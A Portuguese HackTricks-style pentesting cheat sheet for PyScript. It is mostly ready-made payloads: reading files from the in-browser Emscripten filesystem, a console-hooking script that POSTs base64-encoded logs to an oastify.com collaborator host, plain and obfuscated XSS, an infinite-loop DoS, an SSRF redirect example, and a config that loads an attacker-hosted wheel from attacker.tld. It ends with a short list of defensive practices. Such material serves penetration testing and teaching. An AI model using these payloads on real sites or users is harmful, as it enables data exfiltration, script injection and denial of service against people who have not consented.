# Pyscript

{{#include ../../banners/hacktricks-training.md}}

## Guia de Pentesting PyScript

PyScript é um novo framework desenvolvido para integrar Python ao HTML, podendo ser usado junto com HTML. Neste cheat sheet, você encontrará como usar PyScript para seus propósitos de teste de penetração.

### Dumping / Recuperando arquivos do sistema de arquivos de memória virtual Emscripten:

`CVE ID: CVE-2022-30286`\
\
Código:
```html
<py-script>
with open('/lib/python3.10/site-packages/_pyodide/_base.py', 'r') as fin: out
= fin.read() print(out)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166847974-978c4e23-05fa-402f-884a-38d91329bac3.png)

### [OOB Data Exfiltration do sistema de arquivos de memória virtual Emscripten (monitoramento de console)](https://github.com/s/jcd3T19P0M8QRnU1KRDk/~/changes/Wn2j4r8jnHsV8mBiqPk5/blogs/the-art-of-vulnerability-chaining-pyscript)

`CVE ID: CVE-2022-30286`\
\
Código:
```html
<py-script>
x = "CyberGuy" if x == "CyberGuy": with
open('/lib/python3.10/asyncio/tasks.py') as output: contents = output.read()
print(contents) print('
<script>
console.pylog = console.log
console.logs = []
console.log = function () {
console.logs.push(Array.from(arguments))
console.pylog.apply(console, arguments)
fetch("http://9hrr8wowgvdxvlel2gtmqbspigo8cx.oastify.com/", {
method: "POST",
headers: { "Content-Type": "text/plain;charset=utf-8" },
body: JSON.stringify({ content: btoa(console.logs) }),
})
}
</script>
')
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848198-49f71ccb-73cf-476b-b8f3-139e6371c432.png)

### Cross Site Scripting (Comum)

Código:
```python
<py-script>
print("<img src=x onerror='alert(document.domain)'>")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848393-e835cf6b-992e-4429-ad66-bc54b98de5cf.png)

### Cross Site Scripting (Python Ofuscado)

Código:
```python
<py-script>
sur = "\u0027al";fur = "e";rt = "rt"
p = "\x22x$$\x22\x29\u0027\x3E"
s = "\x28";pic = "\x3Cim";pa = "g";so = "sr"
e = "c\u003d";q = "x"
y = "o";m = "ner";z = "ror\u003d"

print(pic+pa+" "+so+e+q+" "+y+m+z+sur+fur+rt+s+p)
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848370-d981c94a-ee05-42a8-afb8-ccc4fc9f97a0.png)

### Cross Site Scripting (Ofuscação de JavaScript)

Código:
```html
<py-script>
prinht(""
<script>
var _0x3675bf = _0x5cf5
function _0x5cf5(_0xced4e9, _0x1ae724) {
var _0x599cad = _0x599c()
return (
(_0x5cf5 = function (_0x5cf5d2, _0x6f919d) {
_0x5cf5d2 = _0x5cf5d2 - 0x94
var _0x14caa7 = _0x599cad[_0x5cf5d2]
return _0x14caa7
}),
_0x5cf5(_0xced4e9, _0x1ae724)
)
}
;(function (_0x5ad362, _0x98a567) {
var _0x459bc5 = _0x5cf5,
_0x454121 = _0x5ad362()
while (!![]) {
try {
var _0x168170 =
(-parseInt(_0x459bc5(0x9e)) / 0x1) *
(parseInt(_0x459bc5(0x95)) / 0x2) +
(parseInt(_0x459bc5(0x97)) / 0x3) *
(-parseInt(_0x459bc5(0x9c)) / 0x4) +
-parseInt(_0x459bc5(0x99)) / 0x5 +
(-parseInt(_0x459bc5(0x9f)) / 0x6) *
(parseInt(_0x459bc5(0x9d)) / 0x7) +
(-parseInt(_0x459bc5(0x9b)) / 0x8) *
(-parseInt(_0x459bc5(0x9a)) / 0x9) +
-parseInt(_0x459bc5(0x94)) / 0xa +
(parseInt(_0x459bc5(0x98)) / 0xb) *
(parseInt(_0x459bc5(0x96)) / 0xc)
if (_0x168170 === _0x98a567) break
else _0x454121["push"](_0x454121["shift"]())
} catch (_0x5baa73) {
_0x454121["push"](_0x454121["shift"]())
}
}
})(_0x599c, 0x28895),
prompt(document[_0x3675bf(0xa0)])
function _0x599c() {
var _0x34a15f = [
"15170376Sgmhnu",
"589203pPKatg",
"11BaafMZ",
"445905MAsUXq",
"432bhVZQo",
"14792bfmdlY",
"4FKyEje",
"92890jvCozd",
"36031bizdfX",
"114QrRNWp",
"domain",
"3249220MUVofX",
"18cpppdr",
]
_0x599c = function () {
return _0x34a15f
}
return _0x599c()
}
</script>
"")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848442-2aece7aa-47b5-4ee7-8d1d-0bf981ba57b8.png)

### Ataque DoS (Loop Infinito)

Código:
```html
<py-script>
while True:
print("&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;")
</py-script>
```
![](https://user-images.githubusercontent.com/66295316/166848534-3e76b233-a95d-4cab-bb2c-42dbd764fefa.png)

---

## Novas vulnerabilidades e técnicas (2023-2025)

### Server-Side Request Forgery via redirecionamentos incontroláveis (CVE-2025-50182)

`urllib3 < 2.5.0` ignora os parâmetros `redirect` e `retries` quando é executado **dentro do runtime Pyodide** que é enviado com PyScript. Quando um atacante pode influenciar URLs de destino, ele pode forçar o código Python a seguir redirecionamentos entre domínios, mesmo quando o desenvolvedor os desativou explicitamente ‑ efetivamente contornando a lógica anti-SSRF.
```html
<script type="py">
import urllib3
http = urllib3.PoolManager(retries=False, redirect=False)  # supposed to block redirects
r = http.request("GET", "https://evil.example/302")      # will STILL follow the 302
print(r.status, r.url)
</script>
```
Corrigido em `urllib3 2.5.0` – atualize o pacote na sua imagem PyScript ou fixe uma versão segura em `packages = ["urllib3>=2.5.0"]`. Veja a entrada oficial do CVE para detalhes.

### Carregamento de pacotes arbitrários e ataques à cadeia de suprimentos

Como o PyScript permite URLs arbitrárias na lista `packages`, um ator malicioso que pode modificar ou injetar configurações pode executar **Python totalmente arbitrário** no navegador da vítima:
```html
<py-config>
packages = ["https://attacker.tld/payload-0.0.1-py3-none-any.whl"]
</py-config>
<script type="py">
import payload  # executes attacker-controlled code during installation
</script>
```
*Somente rodas puras em Python são necessárias – nenhum passo de compilação WebAssembly é necessário.* Certifique-se de que a configuração não é controlada pelo usuário e hospede rodas confiáveis em seu próprio domínio com HTTPS e hashes SRI.

### Mudanças na sanitização de saída (2023+)

* `print()` ainda injeta HTML bruto e, portanto, é suscetível a XSS (exemplos acima).
* O novo helper `display()` **escapa HTML por padrão** – a marcação bruta deve ser envolvida em `pyscript.HTML()`.
```python
from pyscript import display, HTML

display("<b>escaped</b>")          # renders literally

display(HTML("<b>not-escaped</b>")) # executes as HTML -> potential XSS if untrusted
```
Esse comportamento foi introduzido em 2023 e está documentado no guia oficial de Built-ins. Confie em `display()` para entradas não confiáveis e evite chamar `print()` diretamente.

---

## Melhores Práticas Defensivas

* **Mantenha os pacotes atualizados** – atualize para `urllib3 >= 2.5.0` e reconstrua regularmente as wheels que são enviadas com o site.
* **Restringir fontes de pacotes** – referencie apenas nomes do PyPI ou URLs de mesma origem, idealmente protegidos com Sub-resource Integrity (SRI).
* **Fortalecer a Política de Segurança de Conteúdo** – desautorizar JavaScript inline (`script-src 'self' 'sha256-…'`) para que blocos `<script>` injetados não possam ser executados.
* **Desautorizar tags `<py-script>` / `<script type="py">` fornecidas pelo usuário** – sanitize HTML no servidor antes de ecoá-lo de volta para outros usuários.
* **Isolar trabalhadores** – se você não precisar de acesso síncrono ao DOM a partir de trabalhadores, ative a flag `sync_main_only` para evitar os requisitos de cabeçalho `SharedArrayBuffer`.

## Referências

* [NVD – CVE-2025-50182](https://nvd.nist.gov/vuln/detail/CVE-2025-50182)
* [Documentação Built-ins do PyScript – `display` & `HTML`](https://docs.pyscript.net/2024.6.1/user-guide/builtins/)

{{#include ../../banners/hacktricks-training.md}}
